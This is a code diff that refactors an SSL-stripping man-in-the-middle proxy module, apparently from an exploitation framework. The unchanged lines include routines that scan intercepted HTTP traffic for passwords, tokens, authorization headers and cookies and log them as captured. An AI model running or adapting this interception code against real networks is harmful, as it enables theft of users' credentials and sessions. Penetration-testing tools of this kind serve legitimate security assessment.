@@ -54,7 +54,7 @@ def _strip_https_from_headers(data: bytes) -> bytes:
 
 def _log_http_traffic(direction: str, data: bytes) -> None:
     """Log HTTP traffic snippets for credential/session capture."""
-    ts = datetime.datetime.now(datetime.timezone.utc).isoformat()
+    ts = datetime.datetime.now(datetime.UTC).isoformat()
     try:
         text = data[:512].decode("latin-1", errors="replace")
         # Flag lines containing credentials or session tokens
@@ -62,10 +62,10 @@ def _log_http_traffic(direction: str, data: bytes) -> None:
             lower = line.lower()
             if any(k in lower for k in ("password", "passwd", "token", "authorization", "cookie", "set-cookie")):
                 print_success(
-                    "[SSL-STRIP] [{}] {} CAPTURED: {}".format(ts, direction, line.strip()[:200])
+                    f"[SSL-STRIP] [{ts}] {direction} CAPTURED: {line.strip()[:200]}"
                 )
             elif line.startswith(("GET ", "POST ", "PUT ", "DELETE ", "HTTP/")):
-                print_info("[SSL-STRIP] [{}] {} {}".format(ts, direction, line.strip()[:160]))
+                print_info(f"[SSL-STRIP] [{ts}] {direction} {line.strip()[:160]}")
     except Exception:
         pass
 
@@ -90,7 +90,7 @@ def _handle_client(
         else:
             upstream = upstream_raw
     except Exception as exc:
-        print_error("[SSL-STRIP] Cannot connect to {}:{}: {}".format(target_host, target_port, exc))
+        print_error(f"[SSL-STRIP] Cannot connect to {target_host}:{target_port}: {exc}")
         client_sock.close()
         return
 
@@ -202,9 +202,7 @@ class Exploit(Exploit):
             print_error("[SSL-STRIP] Set 'destructive true' to enable live proxy.")
             return
 
-        print_status("[SSL-STRIP] Starting SSL strip proxy on {}:{} -> {}:{}...".format(
-            self.listen_host, self.listen_port, self.target, self.target_port
-        ))
+        print_status(f"[SSL-STRIP] Starting SSL strip proxy on {self.listen_host}:{self.listen_port} -> {self.target}:{self.target_port}...")
 
         try:
             server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -212,12 +210,10 @@ class Exploit(Exploit):
             server.bind((str(self.listen_host), int(self.listen_port)))
             server.listen(int(self.max_clients))
         except OSError as exc:
-            print_error("[SSL-STRIP] Bind failed: {}".format(exc))
+            print_error(f"[SSL-STRIP] Bind failed: {exc}")
             return
 
-        print_success("[SSL-STRIP] Listening on {}:{}. Press Ctrl+C to stop.".format(
-            self.listen_host, self.listen_port
-        ))
+        print_success(f"[SSL-STRIP] Listening on {self.listen_host}:{self.listen_port}. Press Ctrl+C to stop.")
         _stop_event.clear()
         server.settimeout(1.0)
 
@@ -225,7 +221,7 @@ class Exploit(Exploit):
             while not _stop_event.is_set():
                 try:
                     client_conn, client_addr = server.accept()
-                except socket.timeout:
+                except TimeoutError:
                     continue
                 t = threading.Thread(
                     target=_handle_client,
